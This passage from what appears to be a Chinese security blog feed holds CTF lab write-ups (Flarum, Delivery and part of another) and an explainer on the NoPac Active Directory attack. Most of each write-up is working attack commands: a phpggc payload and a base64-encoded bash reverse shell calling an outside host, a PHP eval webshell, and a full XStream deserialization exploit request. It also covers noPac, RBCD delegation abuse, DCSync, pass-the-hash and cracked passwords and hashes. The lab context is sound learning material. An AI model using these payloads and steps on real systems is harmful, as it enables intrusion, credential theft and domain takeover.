class="line">sudo vim /etc/hosts#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里</span><br></pre></td></tr></table></figure><p>然后无密码连接上去就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025205200436.png" alt="image-20231025205200436"></p><p>这样的话就拿下第三台机器了</p><p><img src="../images/image-20231025205303611.png" alt="image-20231025205303611"></p><p>拿下第三个flag</p><p>这里的话新创建个用户上去  mimikatz跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p>这里建议直接用管理员启动  这样方便点</p><p><img src="../images/image-20231025205857192.png" alt="image-20231025205857192"></p><p>抓取本地hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhanghui      1232126b24cdf8c9bd2f788a9d7c7ed1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025205951016.png" alt="image-20231025205951016"></p><p><img src="../images/image-20231025213428205.png" alt="image-20231025213428205"></p><p><strong>(这里不直接显示出来  不过不影响 这里就是说zhanghui是MA_Admin组的)</strong></p><p>这里的话说zhanghui是MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac</p><p>(很是抽象)—————————————-noPac的话我写了一篇文章  感兴趣的话可以去搜来看看</p><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><p><strong>(记得就是把整个文件下载下来运行  不要单拿nopac.py出来运行  否则会报错)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025210806151.png" alt="image-20231025210806151"></p><p>属实一步到位   直接就新加用户然后改名打noPac</p><p>和rbcd是有点像的</p><p><img src="../images/image-20231025211006556.png" alt="image-20231025211006556"></p><p>这里的话不用那个新添加计算机也行  因为我们本来域中就有机器账户  并且我们还有权限来修改其属性  所以直接用<code>XR-DESKTOP.xiaorang.lab</code>这台机器就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/&#x27;XR-DESKTOP$&#x27; -hashes &#x27;:0e1f6735dcf951891dbf20a4f0097423&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name &#x27;XR-DESKTOP$&#x27; -old-hash &#x27;:0e1f6735dcf951891dbf20a4f0097423&#x27; -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025211319801.png" alt="image-20231025211319801"></p><p><img src="../images/image-20231025211533457.png" alt="image-20231025211533457"></p><p>题目给的提示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先用fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231025193232597.png&quot; alt=&quot;image-20231025193232597&quot;&gt;&lt;/p&gt;
&lt;p&gt;就只扫到一个8080  8009端口和一个后台管理系统 &lt;/p&gt;</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-NoPac</title>
    <link href="https://ke1nys.github.io/posts/4997e8ba.html"/>
    <id>https://ke1nys.github.io/posts/4997e8ba.html</id>
    <published>2023-10-24T10:07:42.000Z</published>
    <updated>2023-11-22T14:00:54.418Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/-meditation-/articles/16619406.html">参考文章1</a>   <a href="https://blog.csdn.net/weixin_44747030/article/details/127158385">参考文章2</a></p><p>这里是准备讲讲PAC的一个攻击手法 NoPac</p><p>这里是在打春秋云镜的<code>Spoofing</code>遇到的  刚好借此机会来学习一下</p><p><strong>(这里只讲原理  不操作  因为懒得搭建环境…………)</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首先PAC呢  在我们学习这个<a href="https://ke1nys.github.io/posts/1bedf17b.html#%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B">kerberos </a>协议的时候就遇到这个  就是在我们申请TGT票据的时候生成的</p><p>因为我们在申请TGS票据的时候  是不会验证我们是否有权限来访问该服务的  验证是否有权限来访问该服务的时候在我们拿着ST去申请访问的时候  验证的话就是靠我们TGS票据里的PAC</p><p>(TGS里的PAC是从TGT票据中复制过来的)</p><h2 id="漏洞及漏洞原理"><a href="#漏洞及漏洞原理" class="headerlink" title="漏洞及漏洞原理"></a>漏洞及漏洞原理</h2><p>CVE-2021-42278 &amp; CVE-2021-42287</p><ul><li><p>CVE-2021-42278， 机器用户应当是computer$的形式，但是实际并没有验证机器账号是否有$。导致机器用户名可以被模拟冒用。</p></li><li><p>CVE-2021-42287，Kerberos在处理UserName字段时，如果找不到 UserName 的话，KDC会继续查找 UserName$，如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的⽤户。正是因为这个处理逻辑，导致了漏洞的产⽣。触发这个点有两种方式</p><ul><li>跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理UserName的逻辑。</li><li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到⽤户，然后⾛进这个处理UserName的逻辑。</li></ul><p>但是这还是不够，仅仅让KDC⾛进这个处理UserName的逻辑，还不能伪造⾼权限。因为票据中代表⽤户身份权限是数据块是PAC。⽽TGT认购权证中的PAC是根据预认证身份信息⽣成的，这个我们⽆法伪造。因此得想办法在ST服务票据中进⾏伪造。⽽正常的ST服务票据中的PAC是直接拷⻉TGT认购权证中的。因此，得想办法让KDC在TGS-REP的时候重新⽣成PAC，⽽不是拷⻉TGT票据中的PAC。这⾥也有两种⽅式：</p><ul><li>S4U2Self请求：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新⽣成的。</li><li>跨域⽆PAC的TGT票据进⾏TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT认购权证中没有PAC，PAC会重新⽣成。</li></ul></li></ul><p><strong>(这里为什么S4U2Self请求是会重新生成PAC的原因)</strong></p><blockquote><p>S4U2Self  是替代用户去请求TGS票据  不是代表客户端去请求票据</p></blockquote><h2 id="纸上操作"><a href="#纸上操作" class="headerlink" title="纸上操作"></a>纸上操作</h2><ul><li>域机器账户  PC1$</li><li>域控 DC$</li></ul><p>先简单讲一下流程  就是我们先去修改saMAccountName为DC  然后就去请求TGT票据  然后再修改回PC1$  然后使用S4U2Self去申请TGS票据  在KDC验证PAC的时候  因为找不到DC用户  然后就会去找DC$用户  然后找到了  就说明我们用的是域控机器的TGT票据  然后就可以伪造域管去获取TGS了 <strong>(并且重新生了PAC  ———-   是域管的)</strong></p><p><strong>(注意一下  替代用户去申请的TGS票据的时候  替代的用户一定是存在且允许的  不然会失败)</strong></p><p><strong>(下面用的命令可能有点乱  但是咱重要看的是思路  理解后稍微改改就行了)</strong></p><ul><li>第一步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;9z1nc$&#x27; -new-name &#x27;OWA2010CN-god&#x27; -dc-ip 192.168.3.21 &#x27;god.com/mary:admin!@#45&#x27;</span><br><span class="line"></span><br><span class="line">//改名</span><br></pre></td></tr></table></figure><ul><li>第二步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:&quot;r-dc&quot; /password:&quot;1qaz@WSX&quot; /domain:&quot;hacker.lab&quot; /dc:&quot;r-dc.hacker.lab&quot; /nowrap</span><br><span class="line"></span><br><span class="line">//申请TGT票据</span><br></pre></td></tr></table></figure><ul><li>第三步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;OWA2010CN-God&#x27; -new-name &#x27;9z1nc$&#x27; -dc-ip 192.168.3.21 &#x27;god.com/mary:admin!@#45&#x27;</span><br><span class="line"></span><br><span class="line">//该回原来的名字</span><br></pre></td></tr></table></figure><ul><li>第四步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;administrator&quot; /altservice:&quot;ldap/r-dc.hacker.lab&quot; /dc:&quot;r-dc.hacker.lab&quot; /ptt /ticket:base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用s4u协议去申请TGS票据</span><br></pre></td></tr></table></figure><p><strong>然后最后就成功了  这样的话我们就可以拥有域管的权限了</strong></p><p>一般来说noPAC.py工具的话 就可以一步到位了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/-meditation-/articles/16619406.html&quot;&gt;参考文章1&lt;/a&gt;   &lt;a href=&quot;https://blog.csdn.net/weixin_44747030/article/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Flarum</title>
    <link href="https://ke1nys.github.io/posts/dab11f8.html"/>
    <id>https://ke1nys.github.io/posts/dab11f8.html</id>
    <published>2023-10-24T07:30:16.000Z</published>
    <updated>2023-10-25T14:13:34.197Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一波</p><p><img src="../images/image-20231024153826631.png" alt="image-20231024153826631"></p><p>一个80端口</p><p><img src="../images/image-20231024153856241.png" alt="image-20231024153856241"></p><p>这个登录的话是不需要进行验证码或者别的验证东西  所以我们可以进行爆破·</p><p>用那个rockyou.txt就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator::1chris</span><br></pre></td></tr></table></figure><p>爆破出密码后进行登录后台</p><p><img src="../images/image-20231024154244192.png" alt="image-20231024154244192"></p><p>这个cms的话其实就是跟题目给的名字是一样的  <code>Flarum</code></p><p>直接去找洞就行了</p><p>这里用p牛的一篇文章来参考</p><p><a href="https://tttang.com/archive/1714/#toc_0x02-css">https://tttang.com/archive/1714/#toc_0x02-css</a></p><p>先下载一个<code>phpggc</code>  <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>  就是php版的yso</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -p tar -b Monolog/RCE6 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><p>编译成功后会生成一大堆base64代码，复制过来，在后台修改css那里替换下面代码的xxx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import (inline) &#x27;data:text/css;base64,xxx&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024154602503.png" alt="image-20231024154602503"></p><p>保存之后 开启监听  并且重新写一个css进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.test &#123;</span><br><span class="line">    content: data-uri(&#x27;phar://./assets/forum.css&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024154735633.png" alt="image-20231024154735633"></p><p><img src="../images/image-20231024154752600.png" alt="image-20231024154752600"></p><p>低权限  估计要提权拿flag了  先弹个马到msf上</p><p><strong>(这里用的是capabilities   这个的话就是将权限更加细分了而已  不在一股脑除了root就是www-data)</strong></p><p>查看cap权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024155716923.png" alt="image-20231024155716923"></p><p>这个openssl我们可以利用  (flag文件位置已知)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -in &quot;/root/flag/flag01.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024160235538.png" alt="image-20231024160235538"></p><p>接下来就是扫内网挂代理了</p><p><img src="../images/image-20231024160255260.png" alt="image-20231024160255260"></p><p><img src="../images/image-20231024160531332.png" alt="image-20231024160531332"></p><p>整理信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.60.52    getshell </span><br><span class="line"></span><br><span class="line">172.22.60.42        3389   XIAORANG\FILESERVER   (文件服务)</span><br><span class="line"></span><br><span class="line">172.22.60.8          3389   DC XIAORANG\DC</span><br><span class="line"></span><br><span class="line">172.22.60.15          3389  XIAORANG\PC1</span><br></pre></td></tr></table></figure><p>收集完信息后  没有思路了  回去到刚刚获取到的shell的主机上看看  有没有数据库或者啥重要的信息</p><p><img src="../images/image-20231024161012031.png" alt="image-20231024161012031"></p><p>在网站目录下复现一个config.php的配置文件  里面有数据库  但是只能本地连接  我们上传个<code>adminer.php</code>上去</p><p>写个马用蚁剑传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024161321915.png" alt="image-20231024161321915"></p><p>试了一下 发现只有assets是我们有权限写文件进去的</p><p><img src="../images/image-20231024161532024.png" alt="image-20231024161532024"></p><p><img src="../images/image-20231024161633166.png" alt="image-20231024161633166"></p><p>我们将这个表里的内容全部以csv的格式导出  然后execl打开  然后我们就能提取到email这个列的所有数据了</p><p>这个盲猜一手 AS-REP Roasting</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.60.8  xiaorang.lab/ -usersfile flarum_users.txt</span><br><span class="line"></span><br><span class="line">//这里写域控ip是因为申请tgt票据的时候我们是像域控申请的</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024162034987.png" alt="image-20231024162034987"></p><p>这里返回的hash值是session_key的  我们能爆破出用户的密码是因为这个session_key是由用户的密码hash值进行加密的</p><p>然后使用hashcat进行爆破(只爆破出了一个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force 1.txt rockyou.txt</span><br></pre></td></tr></table></figure><p><code>wangyun@XIAORANG.LAB::Adm12geC</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.60.15 -u wangyun -p Adm12geC -d xiaorang.lab</span><br><span class="line"></span><br><span class="line">//测试一下密码是否可靠</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024162317361.png" alt="image-20231024162317361"></p><p>并且这个ip还开了3389端口  尝试rdp</p><p><img src="../images/image-20231024162525165.png" alt="image-20231024162525165"></p><p>卓面上有个xshell 但是只能知道用户名  却不知道密码</p><p>使用<a href="https://github.com/JDArmy/SharpXDecrypt/">https://github.com/JDArmy/SharpXDecrypt/</a> 这个工具  可以帮助我们获取到这个zhangxin用户的密码</p><p><img src="../images/image-20231024162715933.png" alt="image-20231024162715933"></p><p>获取到了该密码</p><p><img src="../images/image-20231024162753044.png" alt="image-20231024162753044"></p><p>在域内</p><p><img src="../images/image-20231024162846936.png" alt="image-20231024162846936"></p><p>并且还是*Account Operators这个组的成员 </p><p><img src="../images/image-20231024162919468.png" alt="image-20231024162919468"></p><p>还是这个电脑的用户</p><p>用sharphound.exe跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -c all -ns 172.22.60.8 --zip --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024163117214.png" alt="image-20231024163117214"></p><p>这下思路就清晰了 </p><p>这里可以发现zhangxin用户属于<strong>Acount Operators</strong>, 因此对域内非域控的所有机器都具有GenericAll权限</p><p>所以这里就可以打<code>RBCD</code>了</p><p>接下来三步走就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 rbcd.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -action write -delegate-to &#x27;FILESERVER$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/FILESERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><p>这里话我们就获取到FILESERVER$这个机器的TGT票据了</p><p>然后直接注入本地来无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure><p>修改/etc/hosts  不然等会域名解析会失败</p><p><img src="../images/image-20231024163431538.png" alt="image-20231024163431538"></p><p>然后无密码登录到FILESERVER$这个机器上  并且是system权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk</span><br></pre></td></tr></table></figure><p>然后就能拿flag了  然后因为这个FILESERVER$具有<code>DCSync</code>权限  </p><p>(因为我们是system权限了  所以我们能导出这台机器的本地hash值)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8</span><br><span class="line"></span><br><span class="line">//类似于mimikatz的logonpasswords</span><br></pre></td></tr></table></figure><p>获取到了这台机器的hash值后  我们还是用上面的脚本  只不过这次是<code>DCSync</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/&#x27;Fileserver$&#x27;:@172.22.60.8 -hashes &#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27; -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>获取到域控hash之后  直接PTH打域控和其他机器了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8 -codec gbk</span><br><span class="line"></span><br><span class="line">//域控</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15 -codec gbk</span><br><span class="line"></span><br><span class="line">//PC1</span><br></pre></td></tr></table></figure><p>结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231024153826631.png&quot; alt=&quot;image-20231024153826631&quot;&gt;&lt;/p&gt;
&lt;p&gt;一个80端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Delivery</title>
    <link href="https://ke1nys.github.io/posts/a3698f4a.html"/>
    <id>https://ke1nys.github.io/posts/a3698f4a.html</id>
    <published>2023-10-20T12:29:38.000Z</published>
    <updated>2023-10-20T14:12:45.767Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一下ip</p><p><img src="../images/image-20231020203451556.png" alt="image-20231020203451556"></p><p>存在一个ftp匿名登录 </p><p>1.txt中没有东西   pom.xml中有一个xstream的低版本漏洞</p><p><img src="../images/image-20231020203643428.png" alt="image-20231020203643428"></p><p><a href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md</a></p><p>在你的vps上开放1099端口，然后用yso起一下服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.234.228:8080</span><br><span class="line">Content-Length: 3115</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://39.99.234.228:8080</span><br><span class="line">Referer: http://39.99.234.228:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;101.42.39.110&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;101.42.39.110&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><p>然后监听端口就行</p><p><img src="../images/image-20231020203853327.png" alt="image-20231020203853327"></p><p>root权限直接拿flag</p><p><img src="../images/image-20231020203928761.png" alt="image-20231020203928761"></p><p>然后扫内网挂代理</p><p><img src="../images/image-20231020204709906.png" alt="image-20231020204709906"></p><p>整理信息</p><figure 